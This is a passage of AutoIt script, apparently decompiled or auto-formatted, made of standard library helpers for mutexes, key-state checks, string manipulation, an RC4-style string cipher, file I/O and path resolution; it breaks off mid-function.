			$ARET = DllCall ( "advapi32.dll" , "bool" , "SetSecurityDescriptorDacl" , "struct*" , $TSECURITYDESCRIPTOR , "bool" , 1 , "ptr" , 0 , "bool" , 0 )
			If @error Then Return SetError ( @error , @extended , 0 )
			If $ARET [ 0 ] Then
				$TSECURITYATTRIBUTES = DllStructCreate ( $TAGSECURITY_ATTRIBUTES )
				DllStructSetData ( $TSECURITYATTRIBUTES , 1 , DllStructGetSize ( $TSECURITYATTRIBUTES ) )
				DllStructSetData ( $TSECURITYATTRIBUTES , 2 , DllStructGetPtr ( $TSECURITYDESCRIPTOR ) )
				DllStructSetData ( $TSECURITYATTRIBUTES , 3 , 0 )
			EndIf
		EndIf
	EndIf
	Local $HANDLE = DllCall ( "kernel32.dll" , "handle" , "CreateMutexW" , "struct*" , $TSECURITYATTRIBUTES , "bool" , 1 , "wstr" , $SOCCURENCENAME )
	If @error Then Return SetError ( @error , @extended , 0 )
	Local $LASTERROR = DllCall ( "kernel32.dll" , "dword" , "GetLastError" )
	If @error Then Return SetError ( @error , @extended , 0 )
	If $LASTERROR [ 0 ] = $ERROR_ALREADY_EXISTS Then
		If BitAND ( $IFLAG , 1 ) Then
			Return SetError ( $LASTERROR [ 0 ] , $LASTERROR [ 0 ] , 0 )
		Else
			Exit - 1
		EndIf
	EndIf
	Return $HANDLE [ 0 ]
EndFunc
Func _ISPRESSED ( $SHEXKEY , $VDLL = "user32.dll" )
	Local $A_R = DllCall ( $VDLL , "short" , "GetAsyncKeyState" , "int" , "0x" & $SHEXKEY )
	If @error Then Return SetError ( @error , @extended , False )
	Return BitAND ( $A_R [ 0 ] , 32768 ) <> 0
EndFunc
Func _VERSIONCOMPARE ( $SVERSION1 , $SVERSION2 )
	If $SVERSION1 = $SVERSION2 Then Return 0
	Local $SEP = "."
	If StringInStr ( $SVERSION1 , $SEP ) = 0 Then $SEP = ","
	Local $AVERSION1 = StringSplit ( $SVERSION1 , $SEP )
	Local $AVERSION2 = StringSplit ( $SVERSION2 , $SEP )
	If UBound ( $AVERSION1 ) <> UBound ( $AVERSION2 ) Or UBound ( $AVERSION1 ) = 0 Then
		SetExtended ( 1 )
		If $SVERSION1 > $SVERSION2 Then
			Return 1
		ElseIf $SVERSION1 < $SVERSION2 Then
			Return - 1
		EndIf
	Else
		For $I = 1 To UBound ( $AVERSION1 ) - 1
			If StringIsDigit ( $AVERSION1 [ $I ] ) And StringIsDigit ( $AVERSION2 [ $I ] ) Then
				If Number ( $AVERSION1 [ $I ] ) > Number ( $AVERSION2 [ $I ] ) Then
					Return 1
				ElseIf Number ( $AVERSION1 [ $I ] ) < Number ( $AVERSION2 [ $I ] ) Then
					Return - 1
				EndIf
			Else
				SetExtended ( 1 )
				If $AVERSION1 [ $I ] > $AVERSION2 [ $I ] Then
					Return 1
				ElseIf $AVERSION1 [ $I ] < $AVERSION2 [ $I ] Then
					Return - 1
				EndIf
			EndIf
		Next
	EndIf
	Return SetError ( 2 , 0 , 0 )
EndFunc
Func __MISC_GETDC ( $HWND )
	Local $ARESULT = DllCall ( "User32.dll" , "handle" , "GetDC" , "hwnd" , $HWND )
	If @error Or Not $ARESULT [ 0 ] Then Return SetError ( 1 , _WINAPI_GETLASTERROR ( ) , 0 )
	Return $ARESULT [ 0 ]
EndFunc
Func __MISC_GETDEVICECAPS ( $HDC , $IINDEX )
	Local $ARESULT = DllCall ( "GDI32.dll" , "int" , "GetDeviceCaps" , "handle" , $HDC , "int" , $IINDEX )
	If @error Then Return SetError ( @error , @extended , 0 )
	Return $ARESULT [ 0 ]
EndFunc
Func __MISC_RELEASEDC ( $HWND , $HDC )
	Local $ARESULT = DllCall ( "User32.dll" , "int" , "ReleaseDC" , "hwnd" , $HWND , "handle" , $HDC )
	If @error Then Return SetError ( @error , @extended , False )
	Return $ARESULT [ 0 ] <> 0
EndFunc
Func _HEXTOSTRING ( $STRHEX )
	If StringLeft ( $STRHEX , 2 ) = "0x" Then Return BinaryToString ( $STRHEX )
	Return BinaryToString ( "0x" & $STRHEX )
EndFunc
Func _STRINGBETWEEN ( $S_STRING , $S_START , $S_END , $V_CASE = - 1 )
	Local $S_CASE = ""
	If $V_CASE = Default Or $V_CASE = - 1 Then $S_CASE = "(?i)"
	Local $S_PATTERN_ESCAPE = "(\.|\||\*|\?|\+|\(|\)|\{|\}|\[|\]|\^|\$|\\)"
	$S_START = StringRegExpReplace ( $S_START , $S_PATTERN_ESCAPE , "\\$1" )
	$S_END = StringRegExpReplace ( $S_END , $S_PATTERN_ESCAPE , "\\$1" )
	If $S_START = "" Then $S_START = "\A"
	If $S_END = "" Then $S_END = "\z"
	Local $A_RET = StringRegExp ( $S_STRING , "(?s)" & $S_CASE & $S_START & "(.*?)" & $S_END , 3 )
	If @error Then Return SetError ( 1 , 0 , 0 )
	Return $A_RET
EndFunc
Func _STRINGENCRYPT ( $I_ENCRYPT , $S_ENCRYPTTEXT , $S_ENCRYPTPASSWORD , $I_ENCRYPTLEVEL = 1 )
	If $I_ENCRYPT <> 0 And $I_ENCRYPT <> 1 Then
		SetError ( 1 , 0 , "" )
	ElseIf $S_ENCRYPTTEXT = "" Or $S_ENCRYPTPASSWORD = "" Then
		SetError ( 1 , 0 , "" )
	Else
		If Number ( $I_ENCRYPTLEVEL ) <= 0 Or Int ( $I_ENCRYPTLEVEL ) <> $I_ENCRYPTLEVEL Then $I_ENCRYPTLEVEL = 1
		Local $V_ENCRYPTMODIFIED
		Local $I_ENCRYPTCOUNTH
		Local $I_ENCRYPTCOUNTG
		Local $V_ENCRYPTSWAP
		Local $AV_ENCRYPTBOX [ 256 ] [ 2 ]
		Local $I_ENCRYPTCOUNTA
		Local $I_ENCRYPTCOUNTB
		Local $I_ENCRYPTCOUNTC
		Local $I_ENCRYPTCOUNTD
		Local $I_ENCRYPTCOUNTE
		Local $V_ENCRYPTCIPHER
		Local $V_ENCRYPTCIPHERBY
		If $I_ENCRYPT = 1 Then
			For $I_ENCRYPTCOUNTF = 0 To $I_ENCRYPTLEVEL Step 1
				$I_ENCRYPTCOUNTG = ""
				$I_ENCRYPTCOUNTH = ""
				$V_ENCRYPTMODIFIED = ""
				For $I_ENCRYPTCOUNTG = 1 To StringLen ( $S_ENCRYPTTEXT )
					If $I_ENCRYPTCOUNTH = StringLen ( $S_ENCRYPTPASSWORD ) Then
						$I_ENCRYPTCOUNTH = 1
					Else
						$I_ENCRYPTCOUNTH += 1
					EndIf
					$V_ENCRYPTMODIFIED = $V_ENCRYPTMODIFIED & Chr ( BitXOR ( Asc ( StringMid ( $S_ENCRYPTTEXT , $I_ENCRYPTCOUNTG , 1 ) ) , Asc ( StringMid ( $S_ENCRYPTPASSWORD , $I_ENCRYPTCOUNTH , 1 ) ) , 255 ) )
				Next
				$S_ENCRYPTTEXT = $V_ENCRYPTMODIFIED
				$I_ENCRYPTCOUNTA = ""
				$I_ENCRYPTCOUNTB = 0
				$I_ENCRYPTCOUNTC = ""
				$I_ENCRYPTCOUNTD = ""
				$I_ENCRYPTCOUNTE = ""
				$V_ENCRYPTCIPHERBY = ""
				$V_ENCRYPTCIPHER = ""
				$V_ENCRYPTSWAP = ""
				$AV_ENCRYPTBOX = ""
				Local $AV_ENCRYPTBOX [ 256 ] [ 2 ]
				For $I_ENCRYPTCOUNTA = 0 To 255
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 1 ] = Asc ( StringMid ( $S_ENCRYPTPASSWORD , Mod ( $I_ENCRYPTCOUNTA , StringLen ( $S_ENCRYPTPASSWORD ) ) + 1 , 1 ) )
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ] = $I_ENCRYPTCOUNTA
				Next
				For $I_ENCRYPTCOUNTA = 0 To 255
					$I_ENCRYPTCOUNTB = Mod ( ( $I_ENCRYPTCOUNTB + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ] + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 1 ] ) , 256 )
					$V_ENCRYPTSWAP = $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ]
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ] = $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTB ] [ 0 ]
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTB ] [ 0 ] = $V_ENCRYPTSWAP
				Next
				For $I_ENCRYPTCOUNTA = 1 To StringLen ( $S_ENCRYPTTEXT )
					$I_ENCRYPTCOUNTC = Mod ( ( $I_ENCRYPTCOUNTC + 1 ) , 256 )
					$I_ENCRYPTCOUNTD = Mod ( ( $I_ENCRYPTCOUNTD + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTC ] [ 0 ] ) , 256 )
					$I_ENCRYPTCOUNTE = $AV_ENCRYPTBOX [ Mod ( ( $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTC ] [ 0 ] + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTD ] [ 0 ] ) , 256 ) ] [ 0 ]
					$V_ENCRYPTCIPHERBY = BitXOR ( Asc ( StringMid ( $S_ENCRYPTTEXT , $I_ENCRYPTCOUNTA , 1 ) ) , $I_ENCRYPTCOUNTE )
					$V_ENCRYPTCIPHER &= Hex ( $V_ENCRYPTCIPHERBY , 2 )
				Next
				$S_ENCRYPTTEXT = $V_ENCRYPTCIPHER
			Next
		Else
			For $I_ENCRYPTCOUNTF = 0 To $I_ENCRYPTLEVEL Step 1
				$I_ENCRYPTCOUNTB = 0
				$I_ENCRYPTCOUNTC = ""
				$I_ENCRYPTCOUNTD = ""
				$I_ENCRYPTCOUNTE = ""
				$V_ENCRYPTCIPHERBY = ""
				$V_ENCRYPTCIPHER = ""
				$V_ENCRYPTSWAP = ""
				$AV_ENCRYPTBOX = ""
				Local $AV_ENCRYPTBOX [ 256 ] [ 2 ]
				For $I_ENCRYPTCOUNTA = 0 To 255
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 1 ] = Asc ( StringMid ( $S_ENCRYPTPASSWORD , Mod ( $I_ENCRYPTCOUNTA , StringLen ( $S_ENCRYPTPASSWORD ) ) + 1 , 1 ) )
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ] = $I_ENCRYPTCOUNTA
				Next
				For $I_ENCRYPTCOUNTA = 0 To 255
					$I_ENCRYPTCOUNTB = Mod ( ( $I_ENCRYPTCOUNTB + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ] + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 1 ] ) , 256 )
					$V_ENCRYPTSWAP = $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ]
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTA ] [ 0 ] = $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTB ] [ 0 ]
					$AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTB ] [ 0 ] = $V_ENCRYPTSWAP
				Next
				For $I_ENCRYPTCOUNTA = 1 To StringLen ( $S_ENCRYPTTEXT ) Step 2
					$I_ENCRYPTCOUNTC = Mod ( ( $I_ENCRYPTCOUNTC + 1 ) , 256 )
					$I_ENCRYPTCOUNTD = Mod ( ( $I_ENCRYPTCOUNTD + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTC ] [ 0 ] ) , 256 )
					$I_ENCRYPTCOUNTE = $AV_ENCRYPTBOX [ Mod ( ( $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTC ] [ 0 ] + $AV_ENCRYPTBOX [ $I_ENCRYPTCOUNTD ] [ 0 ] ) , 256 ) ] [ 0 ]
					$V_ENCRYPTCIPHERBY = BitXOR ( Dec ( StringMid ( $S_ENCRYPTTEXT , $I_ENCRYPTCOUNTA , 2 ) ) , $I_ENCRYPTCOUNTE )
					$V_ENCRYPTCIPHER = $V_ENCRYPTCIPHER & Chr ( $V_ENCRYPTCIPHERBY )
				Next
				$S_ENCRYPTTEXT = $V_ENCRYPTCIPHER
				$I_ENCRYPTCOUNTG = ""
				$I_ENCRYPTCOUNTH = ""
				$V_ENCRYPTMODIFIED = ""
				For $I_ENCRYPTCOUNTG = 1 To StringLen ( $S_ENCRYPTTEXT )
					If $I_ENCRYPTCOUNTH = StringLen ( $S_ENCRYPTPASSWORD ) Then
						$I_ENCRYPTCOUNTH = 1
					Else
						$I_ENCRYPTCOUNTH += 1
					EndIf
					$V_ENCRYPTMODIFIED &= Chr ( BitXOR ( Asc ( StringMid ( $S_ENCRYPTTEXT , $I_ENCRYPTCOUNTG , 1 ) ) , Asc ( StringMid ( $S_ENCRYPTPASSWORD , $I_ENCRYPTCOUNTH , 1 ) ) , 255 ) )
				Next
				$S_ENCRYPTTEXT = $V_ENCRYPTMODIFIED
			Next
		EndIf
		Return $S_ENCRYPTTEXT
	EndIf
EndFunc
Func _STRINGEXPLODE ( $SSTRING , $SDELIMITER , $ILIMIT = 0 )
	If $ILIMIT > 0 Then
		$SSTRING = StringReplace ( $SSTRING , $SDELIMITER , Chr ( 0 ) , $ILIMIT )
		$SDELIMITER = Chr ( 0 )
	ElseIf $ILIMIT < 0 Then
		Local $IINDEX = StringInStr ( $SSTRING , $SDELIMITER , 0 , $ILIMIT )
		If $IINDEX Then
			$SSTRING = StringLeft ( $SSTRING , $IINDEX - 1 )
		EndIf
	EndIf
	Return StringSplit ( $SSTRING , $SDELIMITER , 3 )
EndFunc
Func _STRINGINSERT ( $S_STRING , $S_INSERTSTRING , $I_POSITION )
	Local $I_LENGTH , $S_START , $S_END
	If $S_STRING = "" Or ( Not IsString ( $S_STRING ) ) Then
		Return SetError ( 1 , 0 , $S_STRING )
	ElseIf $S_INSERTSTRING = "" Or ( Not IsString ( $S_STRING ) ) Then
		Return SetError ( 2 , 0 , $S_STRING )
	Else
		$I_LENGTH = StringLen ( $S_STRING )
		If ( Abs ( $I_POSITION ) > $I_LENGTH ) Or ( Not IsInt ( $I_POSITION ) ) Then
			Return SetError ( 3 , 0 , $S_STRING )
		EndIf
	EndIf
	If $I_POSITION = 0 Then
		Return $S_INSERTSTRING & $S_STRING
	ElseIf $I_POSITION > 0 Then
		$S_START = StringLeft ( $S_STRING , $I_POSITION )
		$S_END = StringRight ( $S_STRING , $I_LENGTH - $I_POSITION )
		Return $S_START & $S_INSERTSTRING & $S_END
	ElseIf $I_POSITION < 0 Then
		$S_START = StringLeft ( $S_STRING , Abs ( $I_LENGTH + $I_POSITION ) )
		$S_END = StringRight ( $S_STRING , Abs ( $I_POSITION ) )
		Return $S_START & $S_INSERTSTRING & $S_END
	EndIf
EndFunc
Func _STRINGPROPER ( $S_STRING )
	Local $IX = 0
	Local $CAPNEXT = 1
	Local $S_NSTR = ""
	Local $S_CURCHAR
	For $IX = 1 To StringLen ( $S_STRING )
		$S_CURCHAR = StringMid ( $S_STRING , $IX , 1 )
		Select
		Case $CAPNEXT = 1
			If StringRegExp ( $S_CURCHAR , "[a-zA-Zہ-ےڑœ‍ں]" ) Then
				$S_CURCHAR = StringUpper ( $S_CURCHAR )
				$CAPNEXT = 0
			EndIf
		Case Not StringRegExp ( $S_CURCHAR , "[a-zA-Zہ-ےڑœ‍ں]" )
			$CAPNEXT = 1
	Case Else
			$S_CURCHAR = StringLower ( $S_CURCHAR )
		EndSelect
		$S_NSTR &= $S_CURCHAR
	Next
	Return $S_NSTR
EndFunc
Func _STRINGREPEAT ( $SSTRING , $IREPEATCOUNT )
	Local $SRESULT
	Select
	Case Not StringIsInt ( $IREPEATCOUNT )
		SetError ( 1 )
		Return ""
	Case StringLen ( $SSTRING ) < 1
		SetError ( 1 )
		Return ""
	Case $IREPEATCOUNT <= 0
		SetError ( 1 )
		Return ""
Case Else
		For $ICOUNT = 1 To $IREPEATCOUNT
			$SRESULT &= $SSTRING
		Next
		Return $SRESULT
	EndSelect
EndFunc
Func _STRINGREVERSE ( $S_STRING )
	Local $I_LEN = StringLen ( $S_STRING )
	If $I_LEN < 1 Then Return SetError ( 1 , 0 , "" )
	Local $T_CHARS = DllStructCreate ( "char[" & $I_LEN + 1 & "]" )
	DllStructSetData ( $T_CHARS , 1 , $S_STRING )
	Local $A_REV = DllCall ( "msvcrt.dll" , "ptr:cdecl" , "_strrev" , "struct*" , $T_CHARS )
	If @error Or $A_REV [ 0 ] = 0 Then Return SetError ( 2 , 0 , "" )
	Return DllStructGetData ( $T_CHARS , 1 )
EndFunc
Func _STRINGTOHEX ( $STRCHAR )
	Return Hex ( StringToBinary ( $STRCHAR ) )
EndFunc
Global Const $FC_NOOVERWRITE = 0
Global Const $FC_OVERWRITE = 1
Global Const $FT_MODIFIED = 0
Global Const $FT_CREATED = 1
Global Const $FT_ACCESSED = 2
Global Const $FO_READ = 0
Global Const $FO_APPEND = 1
Global Const $FO_OVERWRITE = 2
Global Const $FO_BINARY = 16
Global Const $FO_UNICODE = 32
Global Const $FO_UTF16_LE = 32
Global Const $FO_UTF16_BE = 64
Global Const $FO_UTF8 = 128
Global Const $FO_UTF8_NOBOM = 256
Global Const $EOF = - 1
Global Const $FD_FILEMUSTEXIST = 1
Global Const $FD_PATHMUSTEXIST = 2
Global Const $FD_MULTISELECT = 4
Global Const $FD_PROMPTCREATENEW = 8
Global Const $FD_PROMPTOVERWRITE = 16
Global Const $CREATE_NEW = 1
Global Const $CREATE_ALWAYS = 2
Global Const $OPEN_EXISTING = 3
Global Const $OPEN_ALWAYS = 4
Global Const $TRUNCATE_EXISTING = 5
Global Const $INVALID_SET_FILE_POINTER = - 1
Global Const $FILE_BEGIN = 0
Global Const $FILE_CURRENT = 1
Global Const $FILE_END = 2
Global Const $FILE_ATTRIBUTE_READONLY = 1
Global Const $FILE_ATTRIBUTE_HIDDEN = 2
Global Const $FILE_ATTRIBUTE_SYSTEM = 4
Global Const $FILE_ATTRIBUTE_DIRECTORY = 16
Global Const $FILE_ATTRIBUTE_ARCHIVE = 32
Global Const $FILE_ATTRIBUTE_DEVICE = 64
Global Const $FILE_ATTRIBUTE_NORMAL = 128
Global Const $FILE_ATTRIBUTE_TEMPORARY = 256
Global Const $FILE_ATTRIBUTE_SPARSE_FILE = 512
Global Const $FILE_ATTRIBUTE_REPARSE_POINT = 1024
Global Const $FILE_ATTRIBUTE_COMPRESSED = 2048
Global Const $FILE_ATTRIBUTE_OFFLINE = 4096
Global Const $FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 8192
Global Const $FILE_ATTRIBUTE_ENCRYPTED = 16384
Global Const $FILE_SHARE_READ = 1
Global Const $FILE_SHARE_WRITE = 2
Global Const $FILE_SHARE_DELETE = 4
Global Const $GENERIC_ALL = 268435456
Global Const $GENERIC_EXECUTE = 536870912
Global Const $GENERIC_WRITE = 1073741824
Global Const $GENERIC_READ = 2147483648
Func _FILECOUNTLINES ( $SFILEPATH )
	Local $HFILE = FileOpen ( $SFILEPATH , $FO_READ )
	If $HFILE = - 1 Then Return SetError ( 1 , 0 , 0 )
	Local $SFILECONTENT = StringStripWS ( FileRead ( $HFILE ) , 2 )
	FileClose ( $HFILE )
	Local $ATMP
	If StringInStr ( $SFILECONTENT , @LF ) Then
		$ATMP = StringSplit ( StringStripCR ( $SFILECONTENT ) , @LF )
	ElseIf StringInStr ( $SFILECONTENT , @CR ) Then
		$ATMP = StringSplit ( $SFILECONTENT , @CR )
	Else
		If StringLen ( $SFILECONTENT ) Then
			Return 1
		Else
			Return SetError ( 2 , 0 , 0 )
		EndIf
	EndIf
	Return $ATMP [ 0 ]
EndFunc
Func _FILECREATE ( $SFILEPATH )
	Local $HOPENFILE = FileOpen ( $SFILEPATH , $FO_OVERWRITE )
	If $HOPENFILE = - 1 Then Return SetError ( 1 , 0 , 0 )
	Local $HWRITEFILE = FileWrite ( $HOPENFILE , "" )
	FileClose ( $HOPENFILE )
	If $HWRITEFILE = - 1 Then Return SetError ( 2 , 0 , 0 )
	Return 1
EndFunc
Func _FILELISTTOARRAY ( $SPATH , $SFILTER = "*" , $IFLAG = 0 )
	Local $HSEARCH , $SFILE , $SFILELIST , $SDELIM = "|"
	$SPATH = StringRegExpReplace ( $SPATH , "[\\/]+\z" , "" ) & "\"
	If Not FileExists ( $SPATH ) Then Return SetError ( 1 , 1 , "" )
	If StringRegExp ( $SFILTER , "[\\/:><\|]|(?s)\A\s*\z" ) Then Return SetError ( 2 , 2 , "" )
	If Not ( $IFLAG = 0 Or $IFLAG = 1 Or $IFLAG = 2 ) Then Return SetError ( 3 , 3 , "" )
	$HSEARCH = FileFindFirstFile ( $SPATH & $SFILTER )
	If @error Then Return SetError ( 4 , 4 , "" )
	While 1
		$SFILE = FileFindNextFile ( $HSEARCH )
		If @error Then ExitLoop
		If ( $IFLAG + @extended = 2 ) Then ContinueLoop
		$SFILELIST &= $SDELIM & $SFILE
	WEnd
	FileClose ( $HSEARCH )
	If Not $SFILELIST Then Return SetError ( 4 , 4 , "" )
	Return StringSplit ( StringTrimLeft ( $SFILELIST , 1 ) , "|" )
EndFunc
Func _FILEPRINT ( $S_FILE , $I_SHOW = @SW_HIDE )
	Local $A_RET = DllCall ( "shell32.dll" , "int" , "ShellExecuteW" , "hwnd" , 0 , "wstr" , "print" , "wstr" , $S_FILE , "wstr" , "" , "wstr" , "" , "int" , $I_SHOW )
	If @error Then Return SetError ( @error , @extended , 0 )
	If $A_RET [ 0 ] <= 32 Then Return SetError ( 10 , $A_RET [ 0 ] , 0 )
	Return 1
EndFunc
Func _FILEREADTOARRAY ( $SFILEPATH , ByRef $AARRAY )
	Local $HFILE = FileOpen ( $SFILEPATH , $FO_READ )
	If $HFILE = - 1 Then Return SetError ( 1 , 0 , 0 )
	Local $AFILE = FileRead ( $HFILE , FileGetSize ( $SFILEPATH ) )
	If StringRight ( $AFILE , 1 ) = @LF Then $AFILE = StringTrimRight ( $AFILE , 1 )
	If StringRight ( $AFILE , 1 ) = @CR Then $AFILE = StringTrimRight ( $AFILE , 1 )
	FileClose ( $HFILE )
	If StringInStr ( $AFILE , @LF ) Then
		$AARRAY = StringSplit ( StringStripCR ( $AFILE ) , @LF )
	ElseIf StringInStr ( $AFILE , @CR ) Then
		$AARRAY = StringSplit ( $AFILE , @CR )
	Else
		If StringLen ( $AFILE ) Then
			Dim $AARRAY [ 2 ] = [ 1 , $AFILE ]
		Else
			Return SetError ( 2 , 0 , 0 )
		EndIf
	EndIf
	Return 1
EndFunc
Func _FILEWRITEFROMARRAY ( $FILE , $A_ARRAY , $I_BASE = 0 , $I_UBOUND = 0 , $S_DELIM = "|" )
	If Not IsArray ( $A_ARRAY ) Then Return SetError ( 2 , 0 , 0 )
	Local $IDIMS = UBound ( $A_ARRAY , 0 )
	If $IDIMS > 2 Then Return SetError ( 4 , 0 , 0 )
	Local $LAST = UBound ( $A_ARRAY ) - 1
	If $I_UBOUND < 1 Or $I_UBOUND > $LAST Then $I_UBOUND = $LAST
	If $I_BASE < 0 Or $I_BASE > $LAST Then $I_BASE = 0
	Local $HFILE
	If IsString ( $FILE ) Then
		$HFILE = FileOpen ( $FILE , $FO_OVERWRITE )
	Else
		$HFILE = $FILE
	EndIf
	If $HFILE = - 1 Then Return SetError ( 1 , 0 , 0 )
	Local $ERRORSAV = 0
	Switch $IDIMS
	Case 1
		For $X = $I_BASE To $I_UBOUND
			If FileWrite ( $HFILE , $A_ARRAY [ $X ] & @CRLF ) = 0 Then
				$ERRORSAV = 3
				ExitLoop
			EndIf
		Next
	Case 2
		Local $S_TEMP
		For $X = $I_BASE To $I_UBOUND
			$S_TEMP = $A_ARRAY [ $X ] [ 0 ]
			For $Y = 1 To $IDIMS
				$S_TEMP &= $S_DELIM & $A_ARRAY [ $X ] [ $Y ]
			Next
			If FileWrite ( $HFILE , $S_TEMP & @CRLF ) = 0 Then
				$ERRORSAV = 3
				ExitLoop
			EndIf
		Next
	EndSwitch
	If IsString ( $FILE ) Then FileClose ( $HFILE )
	If $ERRORSAV Then Return SetError ( $ERRORSAV , 0 , 0 )
	Return 1
EndFunc
Func _FILEWRITELOG ( $SLOGPATH , $SLOGMSG , $IFLAG = - 1 )
	Local $HOPENFILE = $SLOGPATH , $IOPENMODE = $FO_APPEND
	Local $SDATENOW = @YEAR & "-" & @MON & "-" & @MDAY
	Local $STIMENOW = @HOUR & ":" & @MIN & ":" & @SEC
	Local $SMSG = $SDATENOW & " " & $STIMENOW & " : " & $SLOGMSG
	If $IFLAG <> - 1 Then
		$SMSG &= @CRLF & FileRead ( $SLOGPATH )
		$IOPENMODE = $FO_OVERWRITE
	EndIf
	If IsString ( $SLOGPATH ) Then
		$HOPENFILE = FileOpen ( $SLOGPATH , $IOPENMODE )
		If $HOPENFILE = - 1 Then
			Return SetError ( 1 , 0 , 0 )
		EndIf
	EndIf
	Local $IRETURN = FileWriteLine ( $HOPENFILE , $SMSG )
	If IsString ( $SLOGPATH ) Then
		$IRETURN = FileClose ( $HOPENFILE )
	EndIf
	If $IRETURN <= 0 Then
		Return SetError ( 2 , $IRETURN , 0 )
	EndIf
	Return $IRETURN
EndFunc
Func _FILEWRITETOLINE ( $SFILE , $ILINE , $STEXT , $FOVERWRITE = 0 )
	If $ILINE <= 0 Then Return SetError ( 4 , 0 , 0 )
	If Not IsString ( $STEXT ) Then
		$STEXT = String ( $STEXT )
		If $STEXT = "" Then Return SetError ( 6 , 0 , 0 )
	EndIf
	If $FOVERWRITE <> 0 And $FOVERWRITE <> 1 Then Return SetError ( 5 , 0 , 0 )
	If Not FileExists ( $SFILE ) Then Return SetError ( 2 , 0 , 0 )
	Local $SREAD_FILE = FileRead ( $SFILE )
	Local $ASPLIT_FILE = StringSplit ( StringStripCR ( $SREAD_FILE ) , @LF )
	If UBound ( $ASPLIT_FILE ) < $ILINE Then Return SetError ( 1 , 0 , 0 )
	Local $IENCODING = FileGetEncoding ( $SFILE )
	Local $HFILE = FileOpen ( $SFILE , $IENCODING + $FO_OVERWRITE )
	If $HFILE = - 1 Then Return SetError ( 3 , 0 , 0 )
	$SREAD_FILE = ""
	For $I = 1 To $ASPLIT_FILE [ 0 ]
		If $I = $ILINE Then
			If $FOVERWRITE = 1 Then
				If $STEXT <> "" Then $SREAD_FILE &= $STEXT & @CRLF
			Else
				$SREAD_FILE &= $STEXT & @CRLF & $ASPLIT_FILE [ $I ] & @CRLF
			EndIf
		ElseIf $I < $ASPLIT_FILE [ 0 ] Then
			$SREAD_FILE &= $ASPLIT_FILE [ $I ] & @CRLF
		ElseIf $I = $ASPLIT_FILE [ 0 ] Then
			$SREAD_FILE &= $ASPLIT_FILE [ $I ]
		EndIf
	Next
	FileWrite ( $HFILE , $SREAD_FILE )
	FileClose ( $HFILE )
	Return 1
EndFunc
Func _PATHFULL ( $SRELATIVEPATH , $SBASEPATH = @WorkingDir )
	If Not $SRELATIVEPATH Or $SRELATIVEPATH = "." Then Return $SBASEPATH
	Local $SFULLPATH = StringReplace ( $SRELATIVEPATH , "/" , "\" )
	Local Const $SFULLPATHCONST = $SFULLPATH
	Local $SPATH
	Local $BROOTONLY = StringLeft ( $SFULLPATH , 1 ) = "\" And StringMid ( $SFULLPATH , 2 , 1 ) <> "\"
	For $I = 1 To 2
		$SPATH = StringLeft ( $SFULLPATH , 2 )
		If $SPATH = "\\" Then
			$SFULLPATH = StringTrimLeft ( $SFULLPATH , 2 )
			Local $NSERVERLEN = StringInStr ( $SFULLPATH , "\" ) - 1
			$SPATH = "\\" & StringLeft ( $SFULLPATH , $NSERVERLEN )
			$SFULLPATH = StringTrimLeft ( $SFULLPATH , $NSERVERLEN )
			ExitLoop
		ElseIf StringRight ( $SPATH , 1 ) = ":" Then
			$SFULLPATH = StringTrimLeft ( $SFULLPATH , 2 )
			ExitLoop
		Else
			$SFULLPATH = $SBASEPATH & "\" & $SFULLPATH
		EndIf
	Next
	If $I = 3 Then Return ""
	If StringLeft ( $SFULLPATH , 1 ) <> "\" Then
		If StringLeft ( $SFULLPATHCONST , 2 ) = StringLeft ( $SBASEPATH , 2 ) Then
			$SFULLPATH = $SBASEPATH & "\" & $SFULLPATH
		Else
			$SFULLPATH = "\" & $SFULLPATH
		EndIf
	EndIf
	Local $ATEMP = StringSplit ( $SFULLPATH , "\" )
	Local $APATHPARTS [ $ATEMP [ 0 ] ] , $J = 0
	For $I = 2 To $ATEMP [ 0 ]
		If $ATEMP [ $I ] = ".." Then
			If $J Then $J -= 1
		ElseIf Not ( $ATEMP [ $I ] = "" And $I <> $ATEMP [ 0 ] ) And $ATEMP [ $I ] <> "." Then
			$APATHPARTS [ $J ] = $ATEMP [ $I ]
			$J += 1
		EndIf
	Next
	$SFULLPATH = $SPATH
	If Not $BROOTONLY Then
		For $I = 0 To $J - 1
			$SFULLPATH &= "\" & $APATHPARTS [ $I ]
		Next
	Else
		$SFULLPATH &= $SFULLPATHCONST
		If StringInStr ( $SFULLPATH , ".." ) Then $SFULLPATH = _PATHFULL ( $SFULLPATH )
	EndIf
	While StringInStr ( $SFULLPATH , ".\" )
		$SFULLPATH = StringReplace ( $SFULLPATH , ".\" , "\" )
	WEnd
	Return $SFULLPATH
EndFunc
Func _PATHGETRELATIVE ( $SFROM , $STO )
	If StringRight ( $SFROM , 1 ) <> "\" Then $SFROM &= "\"
	If StringRight ( $STO , 1 ) <> "\" Then $STO &= "\"
	If $SFROM = $STO Then Return SetError ( 1 , 0 , StringTrimRight ( $STO , 1 ) )
	Local $ASFROM = StringSplit ( $SFROM , "\" )
	Local $ASTO = StringSplit ( $STO , "\" )
	If $ASFROM [ 1 ] <> $ASTO [ 1 ] Then Return SetError ( 2 , 0 , StringTrimRight ( $STO , 1 ) )
	Local $I = 2
	Local $IDIFF = 1
	While 1
